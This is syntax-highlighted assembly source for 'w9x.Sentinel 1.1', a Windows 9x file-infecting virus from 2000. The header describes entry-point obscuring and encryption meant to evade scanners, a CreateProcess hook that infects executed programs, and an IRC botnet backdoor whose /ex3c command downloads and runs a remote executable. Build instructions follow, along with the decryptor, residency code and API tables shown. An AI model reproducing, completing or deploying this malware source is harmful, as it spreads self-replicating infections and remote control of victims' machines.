<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>sentinel.asm</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc3 {
	color: #808080;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">;........................................................................;</span><span class="sc0">
</span><span class="sc1">;-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=;</span><span class="sc0">
</span><span class="sc1">;                  w9x.Sentinel 1.1 (c)oded 2000 by f0re </span><span class="sc0">
</span><span class="sc1">;-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Abstract</span><span class="sc0">
</span><span class="sc1">; --------</span><span class="sc0">
</span><span class="sc1">; This is the sourcecode of my first resident  w32 virus. It uses advanced</span><span class="sc0">
</span><span class="sc1">; EPO (entry point obscuring) and has backdoor capabilities via IRC. </span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Virus Specification</span><span class="sc0">
</span><span class="sc1">; -------------------</span><span class="sc0">
</span><span class="sc1">; When an infected  file is executed  the  decryptor receives  control and</span><span class="sc0">
</span><span class="sc1">; decrypts  the  virus  with  the  decryption  key  on  the stack (see EPO </span><span class="sc0">
</span><span class="sc1">; specification).  Next the  virus  goes  resident  by  using the vxdcall0 </span><span class="sc0">
</span><span class="sc1">; backdoor and hooks the CreateProcess api by modifying its address in the</span><span class="sc0">
</span><span class="sc1">; kernel32.dll export table in memory.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; When a new process is created the virus routine receives control and, if </span><span class="sc0">
</span><span class="sc1">; not already present,  launches a new  thread in which an  IRC bot may be</span><span class="sc0">
</span><span class="sc1">; started  (see IRC-BOT specification).  Next  it  will  try to infect the </span><span class="sc0">
</span><span class="sc1">; executed  file.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; The infection procedure consists  globally of the following steps. First</span><span class="sc0">
</span><span class="sc1">; it  will  search  for a  cavity in the file's code section and if one is</span><span class="sc0">
</span><span class="sc1">; found, it  laces  there the  JumpVirus  routine (see EPO specification).</span><span class="sc0">
</span><span class="sc1">; Second it will search for the nth call or jmp opcode in the code section</span><span class="sc0">
</span><span class="sc1">; to replace it with a call to this routine (again see EPO specification).</span><span class="sc0">
</span><span class="sc1">; Third  it  will  copy  the  decryptor  to the end of the file. Fourth it</span><span class="sc0">
</span><span class="sc1">; encrypts  and  copies  the other  portion  of the virus to the file. The </span><span class="sc0">
</span><span class="sc1">; encryption key  that is used  is  the offset of the returnaddress of the </span><span class="sc0">
</span><span class="sc1">; patched api call/jmp. Finally, after the file is infected,  the original</span><span class="sc0">
</span><span class="sc1">; CreateProcess api code is executed.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; EPO specification</span><span class="sc0">
</span><span class="sc1">; ---------------------</span><span class="sc0">
</span><span class="sc1">; As already described,  during  infection the  nth api call or (indirect) </span><span class="sc0">
</span><span class="sc1">; api jmp opcode in the  code  section of the file  is replaced by a  call</span><span class="sc0">
</span><span class="sc1">; to the JumpVirus routine (n is a random number). This routine was placed</span><span class="sc0">
</span><span class="sc1">; in a cavity somewhere  in  the code section. The JumpVirus routine holds</span><span class="sc0">
</span><span class="sc1">; the following 14 bytes of code:</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;   JumpVirusCode:</span><span class="sc0">
</span><span class="sc1">;       xxxx = virtual address of JumpToVirusEntryPoint</span><span class="sc0">
</span><span class="sc1">;   JumpToVirusEntryPoint:</span><span class="sc0">
</span><span class="sc1">;       mov eax, [esp]</span><span class="sc0">
</span><span class="sc1">;       add eax, delta</span><span class="sc0">
</span><span class="sc1">;       jmp eax</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; From the stack this routine takes the return address from the call. Next</span><span class="sc0">
</span><span class="sc1">; a precalculated  number,  called delta, (calculated during infection) is </span><span class="sc0">
</span><span class="sc1">; added which gives  the virtual  address of  the  virus entrypoint. After</span><span class="sc0">
</span><span class="sc1">; jumping to the virusdecryptor code the decryption key is taken from  the</span><span class="sc0">
</span><span class="sc1">; stack (this is the return address from the call) and  the viruscode  can</span><span class="sc0">
</span><span class="sc1">; be decrypted. </span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; For a virusscanner it is now much harder to  decrypt the virus; it first</span><span class="sc0">
</span><span class="sc1">; needs to find the return address of the api  call  or the address of the</span><span class="sc0">
</span><span class="sc1">; cavity  and  the  size  of the  virus  or both to be able to decrypt the </span><span class="sc0">
</span><span class="sc1">; virus.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; IRC BOT specification</span><span class="sc0">
</span><span class="sc1">; ---------------------</span><span class="sc0">
</span><span class="sc1">; When  the  IRC  routine  is  launched, it  will  try to find an internet</span><span class="sc0">
</span><span class="sc1">; connection and if one is found, it launches an IRC BOT, ***a sentinel***</span><span class="sc0">
</span><span class="sc1">; which goes to  undernet #sntnl.  There it  will  sit and wait for remote</span><span class="sc0">
</span><span class="sc1">; commands. The nickname  of a sentinel consists of a randomly chosen name</span><span class="sc0">
</span><span class="sc1">; from a  list  of  names  followed  by two random numbers. In the rest of</span><span class="sc0">
</span><span class="sc1">; this text the name  of a  sentinel is  indicated by xxx.  A sentinel can</span><span class="sc0">
</span><span class="sc1">; understand a  number  of  commands  which  can  be  send  to  a sentinel</span><span class="sc0">
</span><span class="sc1">; privately or  to all  sentinels at  once by  sending  the message to the</span><span class="sc0">
</span><span class="sc1">; channel. The following messages are understood:</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; * all IRC commands, send with the following stucture:</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;   /msg xxx pass /&lt;ircommand&gt; &lt;params&gt;</span><span class="sc0">
</span><span class="sc1">;       </span><span class="sc0">
</span><span class="sc1">;   so for example: /msg xxx pass /privmsg #sntnl :hello there</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; * the installer-command, send with the following structure:</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;   /msg xxx pass /ex3c [&lt;ipnumber&gt;] [&lt;get-command&gt;]</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;   where &lt;ipnumber&gt; = ip-number of  server  where  executable  should</span><span class="sc0">
</span><span class="sc1">;   be downloaded.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;   where  &lt;get-command&gt;  =  the exact  command  according to the HTTP </span><span class="sc0">
</span><span class="sc1">;   protocol to retrieve the file. </span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;   So the command may for example look like:</span><span class="sc0">
</span><span class="sc1">;   </span><span class="sc0">
</span><span class="sc1">;   /msg xxx pass /ex3c [123.45.67.89] [GET /filename.exe HTTP/1.0]</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;   If  a  sentinel  receives  this   command  it  will  download  the</span><span class="sc0">
</span><span class="sc1">;   specified  file. Only  when  the  it  has succesfully received the</span><span class="sc0">
</span><span class="sc1">;   entire file it will execute the file.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; * the status-command, send with the following structure:</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;   /msg xxx pass /st4t</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;   If a sentinel receives this command, it  will  show the status  of</span><span class="sc0">
</span><span class="sc1">;       the installer. Five different statuses are possible:</span><span class="sc0">
</span><span class="sc1">;   </span><span class="sc0">
</span><span class="sc1">;   Waiting/Unable to connect/Installing/Size error/Done</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; * the quit-command, send with the following structure:</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;   /msg xxx pass /qu1t</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; * the nick-command, send with the following structure:</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;   /msg xxx pass /n1ck</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;   This commands tells a  sentinel  to  change its nick into a random</span><span class="sc0">
</span><span class="sc1">;   5 character long name.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; To Compile</span><span class="sc0">
</span><span class="sc1">; ----------</span><span class="sc0">
</span><span class="sc1">; tasm32 sentinel.asm /m /ml</span><span class="sc0">
</span><span class="sc1">; tlink32 -aa sentinel.obj lib\import32.lib</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Greetz</span><span class="sc0">
</span><span class="sc1">; ------</span><span class="sc0">
</span><span class="sc1">; Greetz go  to (in random order):  Blackjack,  Darkman, MrSandman,  Mdrg, </span><span class="sc0">
</span><span class="sc1">; Prizzy, Benny,  rgo32,  Asmod,  Lord Julus, Spanska, DrOwlFS, Bumblebee,</span><span class="sc0">
</span><span class="sc1">; VirusBuster, LifeWire, Gbyte, r-,  veedee, spo0ky,  t00fic  and last but</span><span class="sc0">
</span><span class="sc1">; not least all the other people from #virus/#vxers.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;"""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""";</span><span class="sc0">

</span><span class="sc2">.386</span><span class="sc0">
</span><span class="sc9">.model</span><span class="sc0"> </span><span class="sc10">flat</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">stdcall</span><span class="sc0">

</span><span class="sc5">locals</span><span class="sc0">
</span><span class="sc5">jumps</span><span class="sc0">
    </span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">ExitProcess</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">

    </span><span class="sc9">include</span><span class="sc0"> </span><span class="sc6">inc</span><span class="sc0">\</span><span class="sc5">myinc.inc</span><span class="sc0">
    </span><span class="sc9">include</span><span class="sc0"> </span><span class="sc6">inc</span><span class="sc0">\</span><span class="sc5">wsocks.inc</span><span class="sc0">

</span><span class="sc9">.data</span><span class="sc0">

    </span><span class="sc5">FirstCopy</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">RealStart</span><span class="sc0">

    </span><span class="sc5">Start</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">; decryption key</span><span class="sc0">
    </span><span class="sc6">pushad</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GetCurrentOffset</span><span class="sc0">

    </span><span class="sc5">GetCurrentOffset</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">RealStart</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">GetCurrentOffset</span><span class="sc4">)</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">((</span><span class="sc5">Leap</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">RealStart</span><span class="sc4">)/</span><span class="sc2">4</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc4">)</span><span class="sc0">     </span><span class="sc1">; size to decrypt</span><span class="sc0">

    </span><span class="sc5">DecryptVirus</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">            </span><span class="sc1">; decryption routine</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">04h</span><span class="sc0">
    </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">DecryptVirus</span><span class="sc0">

    </span><span class="sc5">DecryptionDone</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">popad</span><span class="sc0">

    </span><span class="sc5">RealStart</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GetDeltaOffset</span><span class="sc0">

    </span><span class="sc5">GetDeltaOffset</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">GetDeltaOffset</span><span class="sc0">
    
    </span><span class="sc5">SetSEH</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">ErrorHandler</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">; set new SEH handler</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc2">0</span><span class="sc4">]</span><span class="sc0">               </span><span class="sc1">; save old SEH handler</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc2">0</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">           </span><span class="sc1">; initiate SEH frame</span><span class="sc0">

    </span><span class="sc5">CheckWindowsVersion</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">kernel32address</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc12">'ZM'</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">ErrorHandler</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">3ch</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc12">'EP'</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">ErrorHandler</span><span class="sc0">

    </span><span class="sc5">RestoreSEH</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc2">0</span><span class="sc4">]</span><span class="sc0">                </span><span class="sc1">; restore old SEH       </span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">                  </span><span class="sc1">; handler</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">MainRoutines</span><span class="sc0">

    </span><span class="sc5">ErrorHandler</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">              
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc2">0</span><span class="sc4">]</span><span class="sc0">                    
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">                  
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">CheckEpoType</span><span class="sc0">

    </span><span class="sc5">MainRoutines</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">pushad</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">FIND_GETPROCADDRESS_API_ADDRESS</span><span class="sc0">    
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">FIND_VXDCALL0_ADDRESS</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">FIND_USER32_BASE_ADDRESS</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GO_RESIDENT</span><span class="sc0">
    </span><span class="sc6">popad</span><span class="sc0">                       

    </span><span class="sc5">CheckEpoType</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">epo_opcode</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">15FFh</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">EpoJmpExit</span><span class="sc0">

    </span><span class="sc5">EpoCallExit</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">epo_awaa_va</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">; [eax]-&gt; va original jmp</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">   

    </span><span class="sc5">EpoJmpExit</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">epo_awaa_va</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">; [eax]-&gt; va original jmp</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                 
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">   

</span><span class="sc1">;==============================[ includes ]==============================;</span><span class="sc0">


    </span><span class="sc5">hookstruct</span><span class="sc0">          </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">20d</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">
    </span><span class="sc5">zip</span><span class="sc0">             </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"zip"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">delta</span><span class="sc0">               </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">
    </span><span class="sc5">cs_rawsize</span><span class="sc0">          </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">
    </span><span class="sc5">cavity_va</span><span class="sc0">           </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">

    </span><span class="sc5">page_mem_size</span><span class="sc0">           </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc4">((</span><span class="sc5">Leap</span><span class="sc4">-</span><span class="sc5">Start</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">0fffh</span><span class="sc4">)/</span><span class="sc2">1000h</span><span class="sc0">
    </span><span class="sc5">resaddress</span><span class="sc0">          </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">kernel32address</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0bff70000h</span><span class="sc0">
    </span><span class="sc5">user32address</span><span class="sc0">           </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">wsock32address</span><span class="sc0">          </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">imagehlpaddress</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

    </span><span class="sc5">cp_oldapicodeaddress</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">cp_newapicodeaddress</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">cp_oldapicode</span><span class="sc0">           </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">06h</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">
    </span><span class="sc5">cp_newapicode</span><span class="sc0">           </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">06h</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">
    
    </span><span class="sc5">k32</span><span class="sc0">                 </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"KERNEL32.dll"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">user32</span><span class="sc0">              </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"USER32.dll"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">imagehlp</span><span class="sc0">            </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"IMAGEHLP.dll"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
  
    </span><span class="sc5">numberofnames</span><span class="sc0">           </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">addressoffunctions</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">addressofnames</span><span class="sc0">          </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">addressofordinals</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">AONindex</span><span class="sc0">            </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

    </span><span class="sc5">AGetProcAddress</span><span class="sc0">         </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"GetProcAddress"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">  
    </span><span class="sc5">AGetProcAddressA</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">            
    </span><span class="sc5">AMessageBox</span><span class="sc0">             </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"MessageBoxA"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">AMessageBeep</span><span class="sc0">            </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"MessageBeep"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">AGetSystemTime</span><span class="sc0">          </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"GetSystemTime"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">AFindFirstFile</span><span class="sc0">          </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"FindFirstFileA"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">ACreateFile</span><span class="sc0">         </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"CreateFileA"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">ASetCurrentDirectory</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"SetCurrentDirectoryA"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">ASetFileAttributes</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"SetFileAttributesA"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">AGetFileAttributes</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"GetFileAttributesA"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">ACreateFileMapping</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"CreateFileMappingA"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">AMapViewOfFile</span><span class="sc0">          </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"MapViewOfFile"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">AUnmapViewOfFile</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"UnmapViewOfFile"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">ACloseHandle</span><span class="sc0">            </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"CloseHandle"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">ASetFilePointer</span><span class="sc0">         </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"SetFilePointer"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">ASetEndOfFile</span><span class="sc0">           </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"SetEndOfFile"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">AGetModuleHandle</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"GetModuleHandleA"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
